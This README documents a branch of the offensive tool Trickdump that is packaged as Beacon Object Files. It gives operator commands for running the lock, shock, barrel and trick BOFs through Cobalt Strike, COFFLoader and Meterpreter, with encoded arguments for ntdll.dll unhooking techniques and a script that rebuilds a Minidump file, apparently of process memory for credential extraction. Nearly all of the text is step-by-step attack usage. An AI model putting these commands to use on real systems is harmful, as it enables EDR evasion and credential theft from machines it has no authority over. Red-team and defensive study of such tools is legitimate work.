# Trickdump - "bof-flavour" branch

This branch implements the same functionality as the main branch but using BOFs (Beacon Object Files).

You can execute the files using Cobalt Strike, TrustedSec's [COFFLoader](https://github.com/trustedsec/COFFLoader) or Meterpreter's [bofloader module](https://docs.metasploit.com/docs/using-metasploit/advanced/meterpreter/meterpreter-executebof-command.html).


-----------------------------------------

## Cobalt Strike

First import the aggressor scripts:

![bof1](https://raw.githubusercontent.com/ricardojoserf/ricardojoserf.github.io/master/images/trickdump/Screenshot_BOF1.png)

Each BOF file has one optional input argument for overwriting ntdll.dll:
- "disk": Using a DLL already on disk. The default path is "C:\Windows\System32\ntdll.dll".    
- "knowndlls": Using the KnownDlls folder.
- "debugproc": Using a process created in debug mode. The default process is "c:\windows\system32\calc.exe".

```
lock <OVERWRITE_TECHNIQUE>
```

![bof2](https://raw.githubusercontent.com/ricardojoserf/ricardojoserf.github.io/master/images/trickdump/Screenshot_BOF2.png)

```
shock <OVERWRITE_TECHNIQUE>
```

![bof3](https://raw.githubusercontent.com/ricardojoserf/ricardojoserf.github.io/master/images/trickdump/Screenshot_BOF3.png)

```
barrel <OVERWRITE_TECHNIQUE>
``` 

![bof4](https://raw.githubusercontent.com/ricardojoserf/ricardojoserf.github.io/master/images/trickdump/Screenshot_BOF4.png)

If you prefer to generate all the files at the same time, run the Trick BOF:

```
trick <OVERWRITE_TECHNIQUE>
```

![bof6](https://raw.githubusercontent.com/ricardojoserf/ricardojoserf.github.io/master/images/trickdump/Screenshot_BOF6.png)

Finally generate the Minidump file. If you used the Trick BOF unzip the *trick.zip* file, even if there are problems with files headers it should work:

```
python3 create_dump.py [-l LOCK_JSON] [-s SHOCK_JSON] [-b BARREL_JSON] [-z BARREL_ZIP] [-o OUTPUT_FILE]
```

![bof7](https://raw.githubusercontent.com/ricardojoserf/ricardojoserf.github.io/master/images/trickdump/Screenshot_BOF7.png)


-----------------------------------------

## COFFLoader

```
COFFLoader64.exe go <BOF_FILE> <OVERWRITE_TECHNIQUE>
```

The argument to overwrite the ntdll library must be generated using COFFLoader's [beacon_generate.py script](https://github.com/trustedsec/COFFLoader/blob/main/beacon_generate.py):
- "disk": Use the value 09000000050000006469736b00
- "knowndlls": Use the value 0e0000000a0000006b6e6f776e646c6c7300
- "debugproc": Use the value 0e0000000a000000646562756770726f6300
  
Examples running each BOF file with a differente overwrite technique:

```
COFFLoader64.exe go lock_bof.o 09000000050000006469736b00
```

![bof8](https://raw.githubusercontent.com/ricardojoserf/ricardojoserf.github.io/master/images/trickdump/Screenshot_BOF8.png)

```
COFFLoader64.exe go shock_bof.o 0e0000000a0000006b6e6f776e646c6c7300
```

![img9](https://raw.githubusercontent.com/ricardojoserf/ricardojoserf.github.io/master/images/trickdump/Screenshot_BOF9.png)

```
COFFLoader64.exe go barrel_bof.o 0e0000000a000000646562756770726f6300
```

![img10](https://raw.githubusercontent.com/ricardojoserf/ricardojoserf.github.io/master/images/trickdump/Screenshot_BOF10.png)

If you prefer to generate all the files at the same time, run the Trick BOF:

```
COFFLoader64.exe go trick_bof.o <OVERWRITE_TECHNIQUE>
```

![img12](https://raw.githubusercontent.com/ricardojoserf/ricardojoserf.github.io/master/images/trickdump/Screenshot_BOF12.png)


--------------------------------------

## Meterpreter's bofloader module

You can run the BOF files in your Meterpreter session after loading the "bofloader" module and using "--format-string z <technique>" to use a ntdll overwrite technique:

```
load bofloader
execute_bof lock_bof.o --format-string z <OVERWRITE_TECHNIQUE>
execute_bof shock_bof.o --format-string z <OVERWRITE_TECHNIQUE>
execute_bof barrel_bof.o --format-string z <OVERWRITE_TECHNIQUE>
```

![img14](https://raw.githubusercontent.com/ricardojoserf/ricardojoserf.github.io/master/images/trickdump/Screenshot_BOF14.png)

If you prefer to generate all the files at the same time, run the Trick BOF:

```
execute_bof trick_bof.o --format-string z <OVERWRITE_TECHNIQUE>
```

![img16](https://raw.githubusercontent.com/ricardojoserf/ricardojoserf.github.io/master/images/trickdump/Screenshot_BOF16.png)
